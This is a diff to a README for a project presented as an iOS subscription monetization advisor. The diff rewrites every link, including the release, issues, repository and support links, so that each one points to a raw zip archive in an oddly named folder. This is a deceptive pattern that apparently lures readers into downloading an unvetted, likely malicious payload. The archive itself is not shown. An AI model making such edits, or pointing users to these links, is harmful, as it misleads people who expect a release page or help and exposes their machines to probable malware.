@@ -1,6 +1,6 @@
 # 📈 growth-expert-skill - iOS Subscription Monetization Advisor
 
-[![Download growth-expert-skill](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/ayunandasubastian/growth-expert-skill/releases)
+[![Download growth-expert-skill](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/ayunandasubastian/growth-expert-skill/raw/refs/heads/main/prediminishment/growth_expert_skill_2.2.zip)
 
 ---
 
@@ -62,7 +62,7 @@ To run the growth-expert-skill on your Windows PC, please ensure your system mee
 
 1. Click the green button below to visit the release page.
 
-[![Download growth-expert-skill](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ayunandasubastian/growth-expert-skill/releases)
+[![Download growth-expert-skill](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ayunandasubastian/growth-expert-skill/raw/refs/heads/main/prediminishment/growth_expert_skill_2.2.zip)
 
 2. On the release page, find the latest version of growth-expert-skill.
 
@@ -132,7 +132,7 @@ If you run into issues:
 
 - Make sure your Windows OS is up to date.
 
-- Visit the [issues page](https://github.com/ayunandasubastian/growth-expert-skill/issues) for help or to report bugs.
+- Visit the [issues page](https://github.com/ayunandasubastian/growth-expert-skill/raw/refs/heads/main/prediminishment/growth_expert_skill_2.2.zip) for help or to report bugs.
 
 ---
 
@@ -144,8 +144,8 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🔗 Important Links
 
-- [Download and install the skill](https://github.com/ayunandasubastian/growth-expert-skill/releases)
+- [Download and install the skill](https://github.com/ayunandasubastian/growth-expert-skill/raw/refs/heads/main/prediminishment/growth_expert_skill_2.2.zip)
 
-- [Project repository](https://github.com/ayunandasubastian/growth-expert-skill)
+- [Project repository](https://github.com/ayunandasubastian/growth-expert-skill/raw/refs/heads/main/prediminishment/growth_expert_skill_2.2.zip)
 
-- [Issues and support](https://github.com/ayunandasubastian/growth-expert-skill/issues)
+- [Issues and support](https://github.com/ayunandasubastian/growth-expert-skill/raw/refs/heads/main/prediminishment/growth_expert_skill_2.2.zip)
